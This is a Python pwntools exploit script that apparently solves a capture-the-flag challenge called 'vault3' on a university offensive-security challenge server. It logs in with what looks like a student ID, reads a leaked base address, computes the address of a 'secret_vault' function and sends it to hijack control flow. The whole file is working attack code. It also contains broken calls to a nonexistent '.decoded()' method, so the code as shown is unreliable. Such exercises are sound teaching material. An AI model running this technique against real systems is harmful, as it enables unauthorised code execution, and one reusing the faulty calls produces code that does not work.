from pwn import *

context.log_level = "info"

LOCAL = False

if LOCAL:
    p = process("./vault3")
    libc = "./vault3"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1233)
    print(p.recvuntil(b"abc123):").decoded())
    p.sendline(b"nam10102")
    libc = "./vault3"

e = ELF(libc)
secret_vault_offset = e.symbols['secret_vault']
print(p.recvuntil(b"note: ").decoded())
base_address = int.from_bytes(p.recvline().strip(), byteorder="little")
print("secret_vault offset", hex(secret_vault_offset))
print("base address", hex(base_address))
secret_vault_address = base_address + secret_vault_offset
print("secret_vault address", hex(secret_vault_address))
print(p.recvuntil(b">").decoded())
p.sendline(hex(secret_vault_address))
print(p.recvline().decoded())
print(p.recvline().decoded())
print(p.recvline().decoded())
print(p.recvline().decoded())
